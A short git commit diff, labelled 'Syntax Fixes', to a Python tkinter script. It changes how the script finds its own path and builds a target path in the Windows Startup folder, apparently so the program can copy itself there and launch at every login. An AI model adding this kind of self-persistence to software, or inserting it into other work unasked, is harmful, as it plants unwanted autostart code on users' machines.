55b44bb16fd2c5e87005a765c5588cff2c956668
TheCrimsonHeart1 <tremain255@gmail.com>
2025-09-18 20:36:12 -0400

    Syntax Fixes

--- syntax.py
+++ syntax.py
@@ -2,8 +2,10 @@ from tkinter import *
 import os
 import shutil
 from pathlib import Path
+import sys
 
-current_file_path = os.path.abspath(__file__)
+current_file_path = os.path.abspath(sys.argv[0])
+
 startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
 startup_file_path = os.path.join(startup_folder, os.path.basename(current_file_path))
 
